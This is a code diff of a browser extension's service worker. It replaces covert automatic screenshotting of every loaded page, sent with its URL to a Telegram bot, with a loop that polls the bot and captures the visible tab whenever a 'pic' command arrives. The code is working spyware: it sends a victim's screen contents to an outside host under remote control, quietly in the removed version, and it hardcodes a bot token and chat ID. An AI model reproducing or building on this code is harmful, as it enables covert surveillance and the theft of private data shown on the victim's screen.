@@ -1,76 +1,104 @@
-// -------------------- Telegram config (set via Options) --------------------
+// ---------- debug version ----------
 let BOT_TOKEN = '8847410020:AAHShYttoQynYGIBhr4Jmz1V7sD9u1Lopag';
 let CHAT_ID = '6610965250';
+let lastUpdateId = 0;
+let isProcessing = false;
 
-// Load settings on startup
-chrome.storage.local.get(['botToken', 'chatId'], (result) => {
-  BOT_TOKEN = result.botToken || '';
-  CHAT_ID = result.chatId || '';
+console.log('Service worker started');
+
+chrome.storage.local.get(['botToken', 'chatId', 'lastUpdateId'], (r) => {
+  BOT_TOKEN = r.botToken || '';
+  CHAT_ID = r.chatId || '';
+  lastUpdateId = r.lastUpdateId || 0;
+  console.log('Loaded settings - Token:', BOT_TOKEN ? 'present' : 'MISSING', 'Chat ID:', CHAT_ID || 'MISSING');
+  if (BOT_TOKEN && CHAT_ID) {
+    startPolling();
+    console.log('Polling started');
+  } else {
+    console.warn('No token or chat ID – go to Options page to set them.');
+  }
 });
 
-// Listen for settings changes
 chrome.storage.onChanged.addListener((changes) => {
-  if (changes.botToken) BOT_TOKEN = changes.botToken.newValue;
-  if (changes.chatId) CHAT_ID = changes.chatId.newValue;
+  if (changes.botToken) {
+    BOT_TOKEN = changes.botToken.newValue;
+    console.log('Bot token updated');
+  }
+  if (changes.chatId) {
+    CHAT_ID = changes.chatId.newValue;
+    console.log('Chat ID updated');
+  }
+  startPolling();
 });
 
-// -------------------- Cooldown management --------------------
-const MIN_INTERVAL = 5000; // 5 seconds
-async function canCaptureNow() {
-  const { lastCapture } = await chrome.storage.local.get('lastCapture');
-  return !lastCapture || (Date.now() - lastCapture > MIN_INTERVAL);
+function startPolling() {
+  if (!BOT_TOKEN || !CHAT_ID) return;
+  chrome.alarms.create('pollTelegram', { periodInMinutes: 2/60 }); // every 2 sec
 }
 
-async function updateLastCapture() {
-  await chrome.storage.local.set({ lastCapture: Date.now() });
-}
-
-// -------------------- Capture & send --------------------
-async function captureAndSend(tabId) {
-  if (!BOT_TOKEN || !CHAT_ID) return; // not configured
-
-  const allowed = await canCaptureNow();
-  if (!allowed) return;
+chrome.alarms.onAlarm.addListener(async (alarm) => {
+  if (alarm.name !== 'pollTelegram') return;
+  if (isProcessing) {
+    console.log('Alarm skipped – processing in progress');
+    return;
+  }
+  isProcessing = true;
+  console.log('Polling Telegram...');
 
   try {
-    // Capture the active tab (the one where interaction happened)
-    const dataUrl = await chrome.tabs.captureVisibleTab(null, { format: 'png' });
-    await updateLastCapture();
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=2`;
+    const res = await fetch(url);
+    const data = await res.json();
+    console.log('Telegram response:', data);
 
-    // Send to Telegram
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+    if (data.ok && data.result.length) {
+      for (const upd of data.result) {
+        lastUpdateId = upd.update_id;
+        const msg = upd.message;
+        if (msg && msg.chat && String(msg.chat.id) === String(CHAT_ID)) {
+          const text = (msg.text || '').trim();
+          console.log('Received message:', text);
+          if (text.toLowerCase() === 'pic') {
+            console.log('Command Pic detected – capturing screenshot...');
+            await chrome.storage.local.set({ lastUpdateId });
+            await captureActiveTab();
+            break;
+          }
+        }
+      }
+      await chrome.storage.local.set({ lastUpdateId });
+    }
+  } catch (err) {
+    console.error('Polling error:', err);
+  }
+  finally {
+    isProcessing = false;
+  }
+});
+
+async function captureActiveTab() {
+  if (!BOT_TOKEN || !CHAT_ID) return;
+  try {
+    console.log('Taking screenshot...');
+    const dataUrl = await chrome.tabs.captureVisibleTab(null, { format: 'png' });
+    if (!dataUrl) {
+      console.warn('captureVisibleTab returned nothing');
+      return;
+    }
+    console.log('Screenshot captured, sending to Telegram...');
+
     const formData = new FormData();
     formData.append('chat_id', CHAT_ID);
-
-    // Convert data URL to Blob
-    const res = await fetch(dataUrl);
-    const blob = await res.blob();
+    const blob = await (await fetch(dataUrl)).blob();
     formData.append('photo', blob, 'screenshot.png');
 
-    // Caption with page URL and time
-    const tab = await chrome.tabs.get(tabId);
-    const caption = `📄 ${tab.url}\n🕒 ${new Date().toLocaleString()}`;
-    formData.append('caption', caption);
-
-    await fetch(url, { method: 'POST', body: formData });
+    const sendRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method: 'POST',
+      body: formData
+    });
+    const result = await sendRes.json();
+    console.log('Telegram sendPhoto response:', result);
   } catch (err) {
-    // Silent fail – no console logs in production
+    console.error('Capture/send error:', err);
   }
 }
-
-// -------------------- Listeners --------------------
-
-// 1) Content script requests a capture
-chrome.runtime.onMessage.addListener((msg, sender) => {
-  if (msg.action === 'capture' && sender.tab?.id) {
-    captureAndSend(sender.tab.id);
-  }
-});
-
-// 2) Capture on page load (navigation)
-chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
-  if (changeInfo.status === 'complete' && tab.active) {
-    // Small delay to let the page settle
-    setTimeout(() => captureAndSend(tabId), 1500);
-  }
-});
